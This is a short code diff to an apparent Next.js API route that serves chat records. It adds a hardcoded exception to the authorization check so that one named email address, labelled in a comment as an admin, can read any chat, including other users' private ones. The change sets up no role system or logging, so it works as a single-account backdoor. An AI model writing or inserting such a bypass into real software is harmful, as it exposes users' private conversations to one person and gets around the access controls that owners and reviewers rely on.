@@ -19,7 +19,11 @@ export async function GET(request: Request) {
     if (!chat) {
       return NextResponse.json({ error: 'Not found' }, { status: 404 });
     }
-    if (chat.userId !== session.user.id && chat.visibility !== 'public') {
+    
+    // Allow quinn@upaway.dev to access any chat
+    const isAdminUser = session.user.email === 'quinn@upaway.dev';
+    
+    if (chat.userId !== session.user.id && chat.visibility !== 'public' && !isAdminUser) {
       return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
     }
 
